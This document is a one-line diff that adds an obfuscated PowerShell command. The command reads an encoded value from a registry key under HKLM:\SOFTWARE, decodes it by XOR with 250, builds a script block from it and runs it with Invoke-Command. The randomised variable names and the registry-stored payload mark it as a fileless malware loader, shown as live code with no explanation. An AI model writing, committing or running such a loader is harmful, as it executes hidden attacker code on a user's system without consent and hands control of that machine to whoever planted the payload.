@@ -1,0 +1,1 @@
+$YOwdJdhyqBrjr=[ScriptBlock];$bFZOCovsSxoEXr=[string];$zxCCxQRWAHaiD=[char]; icm ($YOwdJdhyqBrjr::Create($bFZOCovsSxoEXr::Join('', ((gp 'HKLM:\SOFTWARE\ClientsHqNIdqGP').'B4Sxy8VYNe' | % { ($_ -bxor (90+157+1+2)) -as $zxCCxQRWAHaiD }))))
